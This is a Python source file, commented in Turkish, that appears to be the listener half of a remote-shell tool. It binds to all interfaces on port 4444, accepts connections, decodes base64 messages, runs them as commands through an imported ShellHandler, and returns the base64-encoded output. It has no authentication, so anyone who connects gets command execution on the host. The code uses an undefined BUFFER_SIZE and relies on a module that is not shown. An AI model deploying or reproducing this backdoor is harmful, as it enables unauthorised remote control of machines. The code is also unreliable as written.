import socket
import threading
import base64
from shell_handler import ShellHandler  # ShellHandler'ı içeri aktarıyoruz

LISTENER_HOST = '0.0.0.0'  # Dinlenecek IP adresi (tüm arayüzler)
LISTENER_PORT = 4444  # Dinleme portu

class Listener:
    def __init__(self, host=LISTENER_HOST, port=LISTENER_PORT):
        self.host = host
        self.port = port
        self.server_socket = None
        self.shell_handler = ShellHandler()

    def start_listener(self):
        """Listener başlatır ve bağlantıları dinler."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f"[INFO] Listening on {self.host}:{self.port}")

            while True:
                client_socket, client_address = self.server_socket.accept()
                print(f"[INFO] Connection established with {client_address}")
                client_handler_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_handler_thread.start()
        except Exception as e:
            print(f"[ERROR] Error starting listener: {str(e)}")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def handle_client(self, client_socket):
        """Bağlantıyı işleyen fonksiyon."""
        try:
            while True:
                # Client'tan gelen veri alınır
                data = client_socket.recv(BUFFER_SIZE)
                if not data:
                    break  # Bağlantı kapandıysa çık

                decoded_data = base64.b64decode(data).decode('utf-8')
                print(f"[INFO] Received data: {decoded_data}")

                # Gelen veriyi komut olarak işle
                self.process_command(decoded_data, client_socket)

        except Exception as e:
            print(f"[ERROR] Error handling client: {str(e)}")
        finally:
            client_socket.close()

    def process_command(self, command_data, client_socket):
        """Gelen komutu işler ve komutun çıktısını gönderir."""
        args = command_data.split()
        command = args[0]

        if command in self.shell_handler.commands:
            try:
                # Komutu çalıştır ve sonucu al
                output = self.shell_handler.commands[command](args[1:])
                # Komut çıktısını client'a gönder
                self.send_output(client_socket, output)
            except Exception as e:
                self.send_output(client_socket, f"Error processing command {command}: {str(e)}")
        else:
            self.send_output(client_socket, f"Unknown command: {command}. Type 'help' for a list of commands.")

    def send_output(self, client_socket, output):
        """Komut çıktısını client'a gönderir."""
        encoded_output = base64.b64encode(output.encode('utf-8')).decode('utf-8')
        client_socket.send(encoded_output.encode('utf-8'))
        print(f"[INFO] Sent output: {output}")

if __name__ == "__main__":
    listener = Listener()
    listener.start_listener()